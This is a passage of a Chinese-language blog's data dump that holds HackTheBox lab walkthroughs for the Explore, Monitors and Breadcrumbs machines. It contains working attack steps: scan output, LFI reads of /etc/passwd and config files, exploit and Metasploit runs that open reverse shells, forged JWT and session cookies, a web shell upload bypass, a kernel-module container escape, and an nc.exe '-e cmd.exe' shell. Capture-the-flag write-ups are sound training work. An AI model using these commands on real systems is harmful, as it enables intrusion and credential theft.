SF::06\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(HTTPOptions,B5,&quot;HTTP/1\\. SF:0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2 SF:009:28:11\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/plai SF:n;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x20 SF:supported:\\x20OPTIONS&quot;)%r(RTSPRequest,BB,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Re SF:quest\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28:11\\x20GMT\\r\\nConte SF:nt-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\ SF:nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version:\\ SF:x20\\x20RTSP/1\\.0&quot;)%r(Help,AE,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDat SF:e:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28:28\\x20GMT\\r\\nContent-Length:\\x SF:2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection: SF:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP&quot;)%r(SSLSessionReq, SF:DD,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x2 SF:02021\\x2009:28:28\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid\\x SF:20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\?\\ SF:0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?&lt;=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0&quot;)%r(TerminalSer SF:verCookie,CA,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2006 SF:\\x20Jul\\x202021\\x2009:28:29\\x20GMT\\r\\nContent-Length:\\x2054\\r\\nContent- SF:Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\ SF:nInvalid\\x20request\\x20line:\\x20\\x03\\0\\0\\*%\\?\\0\\0\\0\\0\\0Cookie:\\x20mstsh SF:ash=nmap&quot;)%r(TLSSessionReq,DB,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDa SF:te:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28:29\\x20GMT\\r\\nContent-Length:\\ SF:x2071\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection SF::\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\0e SF:\\x03\\x03U\\x1c\\?\\?random1random2random3random4\\0\\0\\x0c\\0/\\0&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=7/6%OT=2222%CT=1%CU=35534%PV=Y%DS=2%DC=T%G=Y%TM=60E41F OS:BE%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SE OS:Q(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW6%O2=M54DST11NW6% OS:O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST11NW6%O6=M54DST11)WIN(W1=FFFF%W2 OS:=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M54DNNS OS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y% OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR% OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40% OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G% OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: Device: phone TRACEROUTE (using port 5900/tcp) HOP RTT ADDRESS 1 253.69 ms 10.10.14.1 2 253.76 ms explore.htb (10.10.10.247) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 979.56 seconds 咱们发现，分别在38237、42135和59777上运行了HTTP服务 咱们分别去看看 这边提示是空响应？那做个fuzz看看 ffuf -u http://10.10.10.247:59777/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 100 -e .php,.html ┌──(root💀root)-[~/Desktop] └─# ffuf -u http://10.10.10.247:59777/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 100 -e .php,.html /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.247:59777/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Extensions : .php .html :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 100 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ acct [Status: 301, Size: 65, Words: 3, Lines: 1] bin [Status: 301, Size: 63, Words: 3, Lines: 1] cache [Status: 301, Size: 67, Words: 3, Lines: 1] config [Status: 301, Size: 69, Words: 3, Lines: 1] d [Status: 301, Size: 59, Words: 3, Lines: 1] data [Status: 301, Size: 65, Words: 3, Lines: 1] dev [Status: 301, Size: 63, Words: 3, Lines: 1] etc [Status: 301, Size: 63, Words: 3, Lines: 1] init [Status: 403, Size: 31, Words: 4, Lines: 1] lib [Status: 301, Size: 63, Words: 3, Lines: 1] mnt [Status: 301, Size: 63, Words: 3, Lines: 1] oem [Status: 301, Size: 63, Words: 3, Lines: 1] proc [Status: 301, Size: 65, Words: 3, Lines: 1] product [Status: 301, Size: 71, Words: 3, Lines: 1] sbin [Status: 301, Size: 65, Words: 3, Lines: 1] storage [Status: 301, Size: 71, Words: 3, Lines: 1] sys [Status: 301, Size: 63, Words: 3, Lines: 1] system [Status: 301, Size: 69, Words: 3, Lines: 1] vendor [Status: 301, Size: 69, Words: 3, Lines: 1] :: Progress: [61407/61407] :: Job [1/1] :: 199 req/sec :: Duration: [0:05:35] :: Errors: 0 :: 看到这个目录结构，我感觉这HTTP服务是运行在根目录下的 然后我又去看了一下这台靶机的系统，Android系统，咱们去查找一下Android的敏感文件试试。 经过确认，确实是存在文件读取的漏洞，但我不太了解Android，那应该怎么办呢？简单！摇人儿！在询问玩Android的朋友怎么搞以后，又经过大量的资料查找以及fuzz以后，得到了答案 这里&#x2F;sdcard&#x2F;提示 No directory listing. ，但&#x2F;sdcard1&#x2F;提示 404 file not found. 那么，这里就可以确定，&#x2F;sdcard&#x2F;这个目录是存在的了，咱们继续往下做 漏洞利用在我愚蠢的对50777端口的Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older进行了大量的搜索以后，我才看到一个关键词Minecraft，我丢，这不就是我的世界服务器吗？放弃 然后把眼光放在了 42134 端口上的 ES File Explorer Name Response httpd 上 好家伙，这直接就找到了一个exploit &gt;https://www.exploit-db.com/exploits/50070 该exploit提供了不少可执行命令 cmds = [&#39;listFiles&#39;,&#39;listPics&#39;,&#39;listVideos&#39;,&#39;listAudios&#39;,&#39;listApps&#39;,&#39;listAppsSystem&#39;,&#39;listAppsPhone&#39;,&#39;listAppsSdcard&#39;,&#39;listAppsAll&#39;,&#39;getFile&#39;,&#39;getDeviceInfo&#39;] 使用exploit提供listPics指令获取一些图片文件 python3 exploit.py listPics 10.10.10.247 最终在 http://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg 下找到了一个账号密码 username = kristi password = Kr1sT!5h@Rp3xPl0r3! 咱们使用ssh进行登录 ssh kristi@10.10.10.247 -p 2222 成功拿到shell，咱们找找看文件 在 /sdcard/ 目录下找到了 user.txt 文件，成功拿到user权限的flag，同时想到，咱们是否可直接利用 59777 端口利用文件读取直接读取到该flag呢？ http://10.10.10.247:59777/sdcard/user.txt 事实证明，是可以的 权限提升咱们目前没利用过且无法直接利用的端口只有5555端口了，我估计突破口在这上面，咱们先使用ssh给它转发出来吧 ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 -N -v -v 代理上以后，咱们来分析一下啊。 既然这台Android连接着sd卡，那么应该是开启着ADB调试桥的，也就是说咱们或许可以直接使用ADB进行破解。 说来也巧，这个技巧还是我之前闲着没事儿研究破解Android密码的时候恰巧看到的。 adb connect 127.0.0.1:5555 连接成功后，使用 adb -s 127.0.0.1:5555 shell 登入shell 成功获得root权限 使用find / -name root.txt指令，成功获得root文件位置/data/root.txt 成功拿到root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Monitors - Hackthebox","slug":"Hackthebox/Hard/Hackthebox-Monitors","date":"2021-06-24T11:38:36.000Z","updated":"2023-06-13T03:46:58.000Z","comments":true,"path":"2021/06/24/Hackthebox/Hard/Hackthebox-Monitors/","link":"","permalink":"http://www.lucifiel.com/2021/06/24/Hackthebox/Hard/Hackthebox-Monitors/","excerpt":"","text":"Hackthebox - Monitors靶场信息 靶场类型 信息搜集Nmap首先使用nmap进行信息搜集 nmap -A -sS -sC -sV 10.10.10.238 ┌──(root💀root)-[~/Desktop] └─# nmap -A -sS -sC -sV 10.10.10.238 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 03:09 CST Nmap scan report for 10.10.10.238 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA) | 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA) |_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html; charset=iso-8859-1). No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=6/25%OT=22%CT=1%CU=35010%PV=Y%DS=2%DC=T%G=Y%TM=60D4D89 OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1025/tcp) HOP RTT ADDRESS 1 239.07 ms 10.10.14.1 2 239.14 ms 10.10.10.238 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.56 seconds 我们可以看到，开启了22和80端口，咱们先去80端口看看 Http 不允许使用IP进行访问，那咱们先添加一下hosts吧 echo 10.10.10.238 monitors.htb &gt; /etc/hosts 然后访问monitors.htb，我们把目光放在右下角Powered by Wordpress 这很明显的是wordpress啊，使用wpscan扫描看看 wpscan --url http://monitors.htb/ -e p,t,u 咱们把目光放在这一行wp-with-spritz 找到了一个exp，咱们进去看看 https://www.exploit-db.com/exploits/44544 漏洞利用1. Version Disclosure /wp-content/plugins/wp-with-spritz/readme.txt 2. Source Code if(isset($_GET[&#39;url&#39;])){ $content=file_get_contents($_GET[&#39;url&#39;]); 3. Proof of Concept /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec 根据这个exploit给出的验证，咱们试试是否可用 [http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd](http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd) 成功获取&#x2F;etc&#x2F;passwd文件 然后只是一个Wordpress的站点，咱们直接试试是否可以查看它的配置文件 http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/var/www/wordpress/wp-config.php 成功获得数据库账户密码 DB_NAME = “wordpress” DB_USER = “wpadmin” DB_PASSWORD = “BestAdministrator@2020!” 该账户不存在于&#x2F;etc&#x2F;passwd内，所以应该是无法直接使用ssh进行登录的，咱们想想有没有其他办法进行getshell 尝试使用该账户登录后台，也不可行，好家伙这是逼我动真格了？ 我找到了一篇LFI转RCE的文章 https://infosecwriteups.com/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899 咱们抓个包吧 抓包后将我们自己自定义的1设置为爆破点，然后选择Numbers，设置从1到15 正常来说是会看到一个比较大的包的，但我这里不知道为什么没有，所以我通过其他方式(FUZZ)跑出来了 [http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/000-default.conf](http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/000-default.conf) 然后咱们获得了另一个域名 cacti-admin.monitors.htb，咱们添加进hosts echo 10.10.10.238 cacti-admin.monitors.htb &gt;&gt; /etc/hosts 然后咱们访问一下http://cacti-admin.monitors.htb/ 这个仙人掌界面，我估计我们之前读取到的账号密码可以起作用了 用户名：admin 密码：BestAdministrator@2020! 可总算是登录进后台了 让我们点一下这个仙人掌检查一下版本 版本1.2.12 在github上找到了一个相关的问题 漏洞编号 CVE-2020-14295 这里是确定存在一个注入漏洞，让我们来尝试一下 使用该exploit https://www.exploit-db.com/exploits/49810 看看是否可以直接获得一个shell python3 exploit.py -t http://cacti-admin.monitors.htb -u admin -p &quot;BestAdministrator@2020\\!&quot; --lhost 10.10.14.163 --lport 4444 tips:此处密码的感叹号要用反斜杠进行转义，不然会被编译掉 成功获得一个shell 可以使用python3 -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”;获取一个更加稳定的shell 权限提升 咱们可以看到，只有marcus的目录咱们可以看到，所以咱们肯定是要获取这个用户的权限了 grep &#39;marcus&#39; /etc -R 2&gt;/dev/null 咱们查找一下相关的文件 咱们找到一个脚本 /home/marcus/.backup/backup.sh 查看一下 咱们获得了一个密码 VerticalEdge2020 应该是marcus用户的密码，咱们去使用ssh登录试试 ssh [marcus@10.10.10.238](mailto:marcus@10.10.10.238) 登录成功 成功获得user权限的flag 咱们查看一下note.txt文件 这个提示提到了docker，那咱们去查看一下docker吧 ps aux|grep docker 我看到一个使用 docker-proxy 运行的 docker 容器。所以我搜索了一些关于 dokcer-proxy 的信息 我找到的参考文本 https://docs.docker.com/network/proxy/ 阅读文本后，知道了使用docker-proxy可以通过代理运行docker容器。 知道这个信息后，让我们看看是否有无法从外部访问的端口运行着 netstat -an 有一个8443端口 这应该就是docker-proxy正在侦听的端口了，我们使用ssh创建一个代理隧道 ssh -L 8443:127.0.0.1:8443 [marcus@10.10.10.238](mailto:marcus@10.10.10.238) 然后咱们去访问https://127.0.0.1:8443 会看到有一个tomcat服务器 尝试在Google查找漏洞后，经过努力找到了一个Java 反序列化 https://www.rapid7.com/db/modules/exploit/linux/http/apache_ofbiz_deserialization&#x2F; 如上所述，我将使用msf直接进行攻击 msfconsole启动msf exploit/linux/http/apache_ofbiz_deserialization set rhosts 127.0.0.1 set lhost 10.10.14.163 set lport 5555 set ForceExploit true exploit 咱们成功利用反序列化漏洞以root权限在docker上获得了一个shell 输入shell进入权限 输入capsh –print查看容器的功能 你们猜猜我发现了啥？ docker具有SYS_MODULE权限。因此，容器可以在docker主机的内核中插入&#x2F;删除内核模块 然后我搜索了 docker sys_module 的漏洞，还真找到了 https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd?gi=c12387585c2 根据文章提示，我制作了两个脚本 记得修改IP地址和端口，我这里忘记修改了 然后把脚本上传到docker里 python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; 首先使用python获得一个稳定的shell 然后进入&#x2F;root目录 在本地开启一个http服务器 然后使用wget下载两个脚本 输入make all 输出了很多的文件，但我们只需要reverse-shell.ko 首先我们使用nc监听一个端口 nc -nvlp 4444 然后使用insmod reverse-shell.ko运行我们要的文件 成功提权到root 成功获得root权限的flag 收工睡觉 这几天没有更新，是因为被某厂恶心了一把，让我自我怀疑了一下以为我自己真的很菜。 但经过我时候以后发现，其实我更菜！ 没想到吧，哎嘿 发现我自己更菜以后，我就可以放心的睡觉了，大家晚安","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Breadcrumbs - Hackthebox","slug":"Hackthebox/Hard/Hackthebox-Breadcrumbs","date":"2021-06-19T11:38:36.000Z","updated":"2023-06-13T03:41:54.000Z","comments":true,"path":"2021/06/19/Hackthebox/Hard/Hackthebox-Breadcrumbs/","link":"","permalink":"http://www.lucifiel.com/2021/06/19/Hackthebox/Hard/Hackthebox-Breadcrumbs/","excerpt":"","text":"Hackthebox - Breadcrumbs靶场信息 靶场类型 信息搜集Nmap使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.228 ┌──(root💀root)-[~/Desktop] └─# nmap -A -sS -sC -sV 10.10.10.228 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-19 13:47 CST Nmap scan report for 10.10.10.228 Host is up (0.25s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA) | 256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA) |_ 256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519) 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 |_http-title: Library 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 |_http-title: Library | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds? 3306/tcp open mysql? No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=6/19%OT=22%CT=1%CU=39016%PV=Y%DS=2%DC=T%G=Y%TM=60CD853 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS= OS:U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS OS:%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y% OS:DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD= OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD= OS:Z) Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 11m52s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-06-19T06:00:15 |_ start_date: N/A TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 248.74 ms 10.10.14.1 2 248.83 ms 10.10.10.228 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 59.03 seconds 可以看到，该靶机开启了22、80、135、139、443、445、3306端口 咱们访问一下80端口 Http 点击check books看看 查找图书，咱们随便查找一个 咱们拦截一个包看看 看到有个参数book，是读取网页的，那是否存在LFI（本地文件包含）呢？测试一下 我们可以看到，提示的是没有这个文件，也就是说，确实存在LFI 只不过咱们要访问的页面在上级目录里而已，咱们测试一下 漏洞利用nice，该漏洞确实是存在的，并且可以利用 由于这是一台windows的机器，咱们查看一下他自身存在的一些文件 ../../../../../../WINDOWS/system32/drivers/etc/hosts &quot;# Copyright (c) 1993-2009 Microsoft Corp.\\r\\n#\\r\\n# This is a sample HOSTS file used by Microsoft TCP\\/IP for Windows.\\r\\n#\\r\\n# This file contains the mappings of IP addresses to host names. Each\\r\\n# entry should be kept on an individual line. The IP address should\\r\\n# be placed in the first column followed by the corresponding host name.\\r\\n# The IP address and the host name should be separated by at least one\\r\\n# space.\\r\\n#\\r\\n# Additionally, comments (such as these) may be inserted on individual\\r\\n# lines or following the machine name denoted by a &#39;#&#39; symbol.\\r\\n#\\r\\n# For example:\\r\\n#\\r\\n# 102.54.94.97 rhino.acme.com # source server\\r\\n# 38.25.63.10 x.acme.com # x client host\\r\\n\\r\\n# localhost name resolution is handled within DNS itself.\\r\\n#\\t127.0.0.1 localhost\\r\\n#\\t::1 localhost\\r\\n&quot; 我们之前从错误中看到了关于bookController.php所以让我们尝试读取文件 ../../../../../../Users/www-data/Desktop/xampp/htdocs/includes/bookController.php &quot;&lt;?php\\r\\n\\r\\nif($_SERVER[&#39;REQUEST_METHOD&#39;] == \\&quot;POST\\&quot;){\\r\\n $out = \\&quot;\\&quot;;\\r\\n require &#39;..\\/db\\/db.php&#39;;\\r\\n\\r\\n $title = \\&quot;\\&quot;;\\r\\n $author = \\&quot;\\&quot;;\\r\\n\\r\\n if($_POST[&#39;method&#39;] == 0){\\r\\n if($_POST[&#39;title&#39;] != \\&quot;\\&quot;){\\r\\n $title = \\&quot;%\\&quot;.$_POST[&#39;title&#39;].\\&quot;%\\&quot;;\\r\\n }\\r\\n if($_POST[&#39;author&#39;] != \\&quot;\\&quot;){\\r\\n $author = \\&quot;%\\&quot;.$_POST[&#39;author&#39;].\\&quot;%\\&quot;;\\r\\n }\\r\\n \\r\\n \\r\\n $query = \\&quot;SELECT * FROM books WHERE title LIKE ? OR author LIKE ?\\&quot;;\\r\\n $stmt = $con-&gt;prepare($query);\\r\\n $stmt-&gt;bind_param(&#39;ss&#39;, $title, $author);\\r\\n $stmt-&gt;execute();\\r\\n $res = $stmt-&gt;get_result();\\r\\n $out = mysqli_fetch_all($res,MYSQLI_ASSOC);\\r\\n }\\r\\n\\r\\n elseif($_POST[&#39;method&#39;] == 1){\\r\\n $out = file_get_contents(&#39;..\\/books\\/&#39;.$_POST[&#39;book&#39;]);\\r\\n }\\r\\n\\r\\n else{\\r\\n $out = false;\\r\\n }\\r\\n\\r\\n echo json_encode($out);\\r\\n}&quot; 这时候线索又指向了$out &#x3D; “”;\\r\\n require ‘..&#x2F;db&#x2F;db.php 咱们去查看一下db.php文件 ../../../../../../Users/www-data/Desktop/xampp/htdocs/db/db.php &quot;&lt;?php\\r\\n\\r\\n$host=\\&quot;localhost\\&quot;;\\r\\n$port=3306;\\r\\n$user=\\&quot;bread\\&quot;;\\r\\n$password=\\&quot;jUli901\\&quot;;\\r\\n$dbname=\\&quot;bread\\&quot;;\\r\\n\\r\\n$con = new mysqli($host, $user, $password, $dbname, $port) or die (&#39;Could not connect to the database server&#39; . mysqli_connect_error());\\r\\n?&gt;\\r\\n&quot; 成功得到了3306端口的账号密码 username = bread password = jUli901 咱们尝试登录到mysql 提示失败 咱们换个思路，读取他的login页面，审计一下登录逻辑 ../portal/login.php 咱们给他复制出来审计一下 咱们发现它正在使用authController.php文件，咱们继续追踪过去看看 咱们看到它有使用一段key，咱们复制出来看看 $secret_key = &#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#39; 咱们还能看到，它有使用一个JWT令牌，这个之前咱们用到过的 同时还调用了一个cookie.php页面，咱们继续追踪看看 &quot;&lt;?php\\r\\n\\/**\\r\\n * @param string $username Username requesting session cookie\\r\\n * \\r\\n * @return string $session_cookie Returns the generated cookie\\r\\n * \\r\\n * @devteam\\r\\n * Please DO NOT use default PHPSESSID; our security team says they are predictable.\\r\\n * CHANGE SECOND PART OF MD5 KEY EVERY WEEK\\r\\n * *\\/\\r\\nfunction makesession($username){\\r\\n $max = strlen($username) - 1;\\r\\n $seed = rand(0, $max);\\r\\n $key = \\&quot;s4lTy_stR1nG_\\&quot;.$username[$seed].\\&quot;(!528.\\/9890\\&quot;;\\r\\n $session_cookie = $username.md5($key);\\r\\n\\r\\n return $session_cookie;\\r\\n}&quot; 暂时到这线索就断了，咱们去看看portal目录下还有啥吧 该目录下有一个files.php文件，咱们查看一下 不出意外的话，files的用户应该是paul了 去JWT.io创建一个令牌 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU 咱们去登录 随便注册一个账号，然后登录，然后替换JWT令牌 &lt;?php $username = &quot;paul&quot;; $max = strlen($username) -1; $seed = rand(0, $max); $key = &quot;s4lTy_stR1nG_&quot;.$username[$seed].&quot;(!528./9890&quot;; $session_cookie = $username.md5($key); echo $session_cookie; ?&gt; 使用该脚本获取session进行替换 for i in {0..5};do php session.php;echo &#39;&#39;;sleep 1;done 成功登录为paul账户 File management似乎只允许.zip格式的文件 咱们上传一个phpshell https://github.com/LucifielHack/p0wny-shell 上传的时候 会自动在末尾添加上.zip 咱们在最末尾再手动添加一个.php即可绕过 这只是个前端验证 成功拿到一个phpshell 此处有两个方法得到一个shell 方法一：查看C:\\Users\\www-data\\Desktop\\xampp\\htdocs\\portal\\pizzaDeliveryUserData目录下的juliette.json文件，即可得到一个账号密码，进行SSH登录 type juliette.json username = juliette password = jUli901./())! 方法二：本地使用python3搭建一个http服务器，在phpshell内使用curl进行下载nc.exe，然后使用nc进行shell反弹 本机运行 python3 -m http.server 80 nc -nvlp 4444 phpshell运行 curl [http://localhost/nc.exe -o nc.exe](http://localhost/nc.exe%20-o%20nc.exe) nc.exe localhost 4444 -e cmd.exe 这里看大家自己喜欢什么方式了 成功获得users权限的flag 权限提升 咱们查看一下桌面上todo.html的内容 它声明它将密码存储在名为 Microsoft Store Sticky Notes 的程序中 咱们找过去 参考链接 https://www.thewindowsclub.com/where-are-sticky-notes-saved-in-windows-10 cd 